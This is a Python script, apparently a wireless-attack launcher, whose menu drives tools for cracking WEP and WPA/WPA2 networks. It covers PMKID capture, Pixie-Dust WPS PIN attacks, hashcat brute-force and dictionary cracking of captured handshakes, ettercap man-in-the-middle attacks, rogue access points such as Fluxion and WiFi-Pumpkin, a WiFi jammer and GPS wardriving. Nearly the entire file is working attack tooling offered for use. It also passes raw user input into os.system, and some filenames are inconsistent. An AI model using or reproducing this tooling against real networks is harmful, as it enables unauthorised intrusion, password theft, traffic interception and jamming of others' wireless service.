#!/usr/bin/env python3
import os
from colorama import Fore, Style

interface = input(Fore.CYAN + '[*]Enter interface to use: ' + Style.RESET_ALL)

def wait():
  wait = input('PRESS ENTER TO CONTINUE')

def main():
  print(Fore.GREEN + Style.BRIGHT + '       _   __     __      ______     ______       __')
  print('      / | / /__  / /_    / ____/____/ ____ \_____/ /__')
  print('     /  |/ / _ \/ __/   / /   / ___/ / __ `/ ___/ //_/')
  print('    / /|  /  __/ /_    / /___/ /  / / /_/ / /__/ ,<')
  print('   /_/ |_/\___/\__/____\____/_/   \ \__,_/\___/_/|_|')
  print('                 /_____/           \____/' + Style.RESET_ALL)
  print('==========================================================')
  print(Fore.GREEN + Style.BRIGHT + '*[1] Scan Local Networks (Airodump-ng)                   *')
  print('*[2] Scan Local Networks (Wash)                          *')
  print('*[3] Crack WEP Network                                   *')
  print('*[4] Crack WPA/WPA2 Network Using PMKID Method           *')
  print('*[5] Crack WPA/WPA2 Network Using PIN (Pixie-Dust) Method*')
  print('*[6] Wifite2 (Automated Network Cracker)                 *')
  print('*[7] Ettercap (MiTM Attack)                              *')
  print('*[8] Fluxion (MiTM/Router Spoof Attack)                  *')
  print('*[9] Airgeddon (Attack Framework - Graphical)            *')
  print('*[10] WiFi-Pumpkin (Rogue AP - Graphical)                *')
  print('*[11] WPA/WPA2 Handshake Cracking (Hashcat BF, WL, & RB) *')
  print('*[12] WifiJammer (Use for RPi or w/ multiple adapters)   *')
  print('*[13] HT-WPS (WPS Pin Extraction Tool)                   *')
  print('*[14] Kismet GPS Wardriver                               *')
  print('*[15] Linset (WPA/WPA2 MiTM Attack Tool)                 *')
  print('*[16] Exit                                               *' + Style.RESET_ALL)
  print('==========================================================')
  in_put = input(': ')
  if in_put == '1':
    print(Fore.CYAN + '[*]Make sure to note down network bssid and channel number...')
    os.system('airmon-ng start ' + interface)
    print('[*]Enter ^C or ^Z to exit scanner mode...' + Style.RESET_ALL)
    os.system('airodump-ng ' + interface + 'mon')
    os.system('airmon-ng stop ' + interface + 'mon') 
    wait()
  if in_put == '2':
    print(Fore.CYAN + '[*]Make sure to note down network bssid and channel number...')
    os.system('airmon-ng start ' + interface)
    print('[*]Enter ^C or ^Z to exit scanner mode...' + Style.RESET_ALL)
    os.system('wash -i ' + interface + 'mon')
    os.system('airmon-ng stop ' + interface + 'mon')
    wait()
  if in_put == '3':
    bssid = input(Fore.CYAN + '[*]Enter WEP Network BSSID: ' + Style.RESET_ALL)
    channel = input(Fore.CYAN + '[*]Enter WEP Network Channel: ' + Style.RESET_ALL)
    print(Fore.CYAN + '[*]Gathering Packets From Network: ' + bssid + '... (Wait Until You Have About 1000 IVs)' + Style.RESET_ALL)
    os.system('airmon-ng start ' + interface)
    os.system('besside-ng -b ' + bssid + ' -c ' + channel + ' ' + interface + 'mon')
    os.system('aircrack-ng wep.cap')
    os.system('airmon-ng stop ' + interface + 'mon')
    wait()
  if in_put == '4':
    adapt = input(Fore.CYAN + '[*]Do you have a wifi adapter with packet injection?[y/N]: ' + Style.RESET_ALL)
    if adapt == 'y' or adapt == 'Y':
      bssid = input(Fore.CYAN + '[*]Enter WPA/WPA2 Network BSSID: ' + Style.RESET_ALL)
      channel = input(Fore.CYAN + '[*]Enter WPA/WPA2 Network Channel: ' + Style.RESET_ALL)
      print(Fore.CYAN + '[*]Starting PMKID Attack...')
      os.system('airmon-ng start ' + interface)
      print('[*]Wait about 10 minutes to gather enough packets, use ^C or ^Z to end hcxdumptool...' + Style.RESET_ALL)
      os.system('hcxdumptool -i ' + interface + 'mon -o output.pcapng --enable_status=1')
      print(Fore.CYAN + '[*]Converting output.pcapng to ouputHC.16800 for hashcat bruteforcing...' + Style.RESET_ALL)
      os.system('hcxpcaptool -E essidlist -I identitylist -U usernamelist -z outputHC.18600 output.pcapng')
      print(Fore.GREEN + '[+]File Converted! Use hashcat in these two methods to crack: ' + Style.RESET_ALL)
      print(Fore.CYAN + '  [*]  Wordlist: hashcat -m 16800 outputHC.16800 -a 0 --force wordlist.lst -O')
      print(Fore.CYAN + '  [*]Bruteforce: hashcat -m 16800 outputHC.16800 -a 3 --force ?a?a?a?a?a?a -O')
      os.system('airmon-ng stop ' + interface + 'mon')
      wait()
    else:
      print(Fore.RED + "[*]You can't attack a WPA/WPA2 encrypted network without packet injection..." + Style.RESET_ALL)
      wait()
  if in_put == '5':
    bssid = input(Fore.CYAN + '[*]Enter Network BSSID: ' + Style.RESET_ALL)
    channel = input(Fore.CYAN + '[*]Enter Network Channel: ' + Style.RESET_ALL)
    print(Fore.CYAN + '[*]Running Reaver to attack WPS PIN exploit...' + Style.RESET_ALL)
    os.system('airmon-ng start ' + interface)
    os.system('reaver -i ' + interface + 'mon -b ' + bssid + ' -c ' + channel + '  -vv -Z')
    os.system('airmon-ng stop ' + interface + 'mon')
    wait()
  if in_put == '6':
    print(Fore.CYAN + '[*]Starting Wifite2...' + Style.RESET_ALL)
    try:
      os.chdir('wifite2')
      os.system('python3 Wifite.py')
      print(Fore.GREEN + '[+]Successfully ran wifite.py!' + Style.RESET_ALL)
    except:
      print(Fore.RED + '[*]Error running wifite.py' + Style.RESET_ALL)
    os.chdir('..')
  if in_put == '7':
    got = input(Fore.CYAN + '[*]Do you want to run ettercap in Graphical or Text mode?[G/T]: ' + Style.RESET_ALL)
    try:
      if got == 'G':
        print(Fore.CYAN + '[*]Running ettercap in graphical mode...' + Style.RESET_ALL)
        os.system('sudo ettercap -G')
        print(Fore.GREEN + '[+]Successfully ended ettercap in graphical mode!' + Style.RESET_ALL)
      else:
        print(Fore.CYAN + '[*]Running ettercap in text mode...' + Style.RESET_ALL)
        os.system('sudo ettercap -T')
        print(Fore.GREEN + '[+]Successfully ended ettercap in text mode!' + Style.RESET_ALL)
    except:
      print(Fore.RED + '[*]Error running ettercap!' + Style.RESET_ALL)
    wait()
  if in_put == '8':
    print(Fore.CYAN + '[*]Starting Fluxion...' + Style.RESET_ALL)
    try:
      os.chdir('fluxion')
      os.system('./fluxion.sh')
      print(Fore.GREEN + '[+]Successfully ran fluxion.sh!' + Style.RESET_ALL)
    except:
      print(Fore.RED + '[*]Error running fluxion.sh' + Style.RESET_ALL)
    os.chdir('..')
  if in_put == '9':
    print(Fore.CYAN + '[*]Starting Airgeddon...' + Style.RESET_ALL)
    try:
      os.chdir('airgeddon')
      os.system('./airgeddon.sh')
      print(Fore.GREEN + '[+]Successfully ran airgeddon.sh!' + Style.RESET_ALL)
    except:
      print(Fore.RED + '[*]Error running airgeddon.sh' + Style.RESET_ALL)
    os.chdir('..')
  if in_put == '10':
    print(Fore.CYAN + '[*]Starting WiFi-Pumpkin...' + Style.RESET_ALL)
    try:
      os.system('sudo wifi-pumpkin')
      print(Fore.GREEN + '[+]Successfully ran WiFi-Pumpkin!' + Style.RESET_ALL)
    except:
      print(Fore.RED + '[*]Error running WiFi-Pumpkin' + Style.RESET_ALL)
    wait()
  if in_put == '11':
    print(Fore.GREEN + Style.BRIGHT + '                                   ______       __')
    print('   _________ _____      __________/ ____ \_____/ /__')
    print('  / ___/ __ `/ __ \    / ___/ ___/ / __ `/ ___/ //_/')
    print(' / /__/ /_/ / /_/ /   / /__/ /  / / /_/ / /__/ ,<')
    print(' \___/\__,_/ .___/____\___/_/   \ \__,_/\___/_/|_|')
    print('          /_/   /_____/          \____/' + Style.RESET_ALL)
    print('=========================================================')
    print(Fore.GREEN + Style.BRIGHT + '*[1] Dictionary Attack                                    *')
    print('*[2] Bruteforce Attack                                    *')
    print('*[3] Rulebased Attack                                     *')
    print('*[4] Exit                                                 *'+ Style.RESET_ALL)
    print('========================================================================')
    atk = input(': ')
    if atk == '1':
      check = input(Fore.CYAN + '[*]Did you convert the capture file to hccapx using cap2hccapx.bin in hashcat-utils?[y/N]: ' + Style.RESET_ALL)
      if check == 'y' or check == 'Y':
        hash = input(Fore.CYAN + '[*]Enter path to Capture file (.hccapx): ' + Style.RESET_ALL)
        wordlist = input(Fore.CYAN + '[*]Enter path to wordlist file(.dict/.txt/.wordlist): ' + Style.RESET_ALL)
        print(Fore.CYAN + '[*]Beginning dictionary attack(if running on machine w/ OpenCL Drivers append -O --force -w 3 to utilize GPUs)...' + Style.RESET_ALL)
        os.system('hashcat -m 2500 -a 0 ' + hash + ' ' + wordlist)
        print(Fore.GREEN + '[+]Process finished!' + Style.RESET_ALL)
      else:
        print(Fore.RED + '[*]Convert cap file to .hccapx using cap2hccapx.bin in hashcat-utils!' + Style.RESET_ALL)
      wait()
    elif atk == '2':
      check = input(Fore.CYAN + '[*]Did you convert the capture file to hccapx using cap2hccapx.bin in hashcat-utils?[y/N]: ' + Style.RESET_ALL)
      if check == 'y' or check == 'Y':
        hash = input(Fore.CYAN + '[*]Enter path to Capture file (.hccapx): ' + Style.RESET_ALL)
        print(Fore.CYAN + '[*]Beginning bruteforce attack(if running on machine w/ OpenCL Drivers append -O --force -w 3 to utilize GPUs)...' + Style.RESET_ALL)
        os.system('hashcat -m 2500 -a 3 -i ' + hash + ' ?a?a?a?a?a?a?a?a?a?a --increment --increment-min=2 --increment-max=10')
        print(Fore.GREEN + '[+]Process finished!' + Style.RESET_ALL)
      else:
        print(Fore.RED + '[*]Convert cap file to .hccapx using cap2hccapx.bin in hashcat-utils!' + Style.RESET_ALL)
      wait()
    elif atk == '3':
      check = input(Fore.CYAN + '[*]Did you convert the capture file to hccapx using cap2hccapx.bin in hashcat-utils?[y/N]: ' + Style.RESET_ALL)
      if check == 'y' or check == 'Y':
        hash = input(Fore.CYAN + '[*]Enter path to Capture file (.hccapx): ' + Style.RESET_ALL)
        wordlist = input(Fore.CYAN + '[*]Enter path to wordlist file(.dict/.txt/.wordlist): ' + Style.RESET_ALL)
        rule = input(Fore.CYAN + '[*]Enter path to rule table(.rule/.rules): ' + Style.RESET_ALL)
        print(Fore.CYAN + '[*]Beginning rule-based attack(if running on machine w/ OpenCL Drivers append -O --force -w 3 to utilize GPUs)...' + Style.RESET_ALL)
        os.system('hashcat -m 2500 -a 0 ' + hash + ' ' + wordlist + ' -r ' + rule)
        print(Fore.GREEN + '[+]Process finished!' + Style.RESET_ALL)
      else:
        print(Fore.RED + '[*]Convert cap file to .hccapx using cap2hccapx.bin in hashcat-utils!' + Style.RESET_ALL)
      wait()
    elif atk == '4':
      wait()
  if in_put == '12':
    print(Fore.CYAN + '[*]Starting WiFiJammer Process...')
    print('[*]Shutting down onboard WiFi adapter...' + Style.RESET_ALL)
    os.system('sudo ifconfig wlan0 down')
    os.chdir('wifijam')
    s_o_m = input(Fore.CYAN + "[*]Do you want to run in [s]tationary or [m]oving mode?: " + Style.RESET_ALL)
    if s_o_m == 's' or s_o_m == 'S':
      os.system('sudo python wifijammer.py')
    elif s_o_m == 'm' or s_o_m == 'M':
      os.system('sudo python wifi-jammer.py -m 10')
    else:
      print(Fore.RED + '[*]Not an option!' + Style.RESET_ALL)
    wait()
  if in_put == '13':
    print(Fore.CYAN + '[*]Starting HT-WPS...')
    try:
      os.chdir('HT-WPS-Breaker')
      os.system("sudo ./HT-WB.sh")
      print(Fore.GREEN + '[+]Successfully ran HT-WPS' + Style.RESET_ALL)
    except:
      print(Fore.RED + '[*]Error running HT-WPS' + Style.RESET_ALL)
    os.chdir('..')
  if in_put == '14':
    print(Fore.GREEN + "   _       __              ____       _")
    print("  | |     / /___ ______   / __ \_____(_)   _____ ")
    print("  | | /| / / __ `/ ___/  / / / / ___/ / | / / _ \ ")
    print("  | |/ |/ / /_/ / /     / /_/ / /  / /| |/ /  __/")
    print("  |__/|__/\__,_/_/     /_____/_/  /_/ |___/\___/")
    print("==================================================" + Style.RESET_ALL)
    print(Fore.CYAN + "[*]Insert GPS Device..." + Style.RESET_ALL)
    wait()
    print(Fore.CYAN + "[*]Listing Connected GPS Devices..." + Style.RESET_ALL)
    os.system("sudo lsusb")
    os.system("sudo dmesg | grep tty")
    gpsd = input(Fore.CYAN + "[*]Enter gpsd dev path (/dev/ttyUSB#): " + Style.RESET_ALL)
    os.system("sudo gpsd " + gpsd)
    print(Fore.CYAN + "[*]Attemping to open GPS Device Info")
    print("[*]If info is read, ^C to continue setup, else restart script..." + Style.RESET_ALL)
    os.system("sudo cgps")
    print(Fore.CYAN + "[*]Attempting to run kismet to collect network data in the vicinity, ^C when you're done recording to shutdown Kismet server..." + Style.RESET_ALL)
    os.system('sudo kismet')
    print(Fore.CYAN + "[*]Upload kismet data to Wigle.net to create network map" + Style.RESET_ALL)
    print(Fore.GREEN + "[+]Done!" + Style.RESET_ALL)
  if in_put == '15':
    print(Fore.CYAN + '[*]Starting linset...' + Style.RESET_ALL)
    try:
      os.chdir('linset')
      os.system('sudo ./linset')
      print(Fore.GREEN + '[*]Successfully ran linset' + Style.RESET_ALL)
    except:
      print(Fore.RED + '[*]Error running linset' + Style.RESET_ALL)
    os.chdir('..')
  if in_put == '16':
    print(Fore.CYAN + '[*]Shutting down ' + interface + 'mon...' + Style.RESET_ALL)
    os.system('airmon-ng stop ' + interface)
    os.system('airmon-ng stop ' + interface + 'mon')
    os.system('ifconfig ' + interface + ' up')
    exit()
  else:
    print(Fore.RED + '[*]Not an option!' + Style.RESET_ALL)
  main()
main()
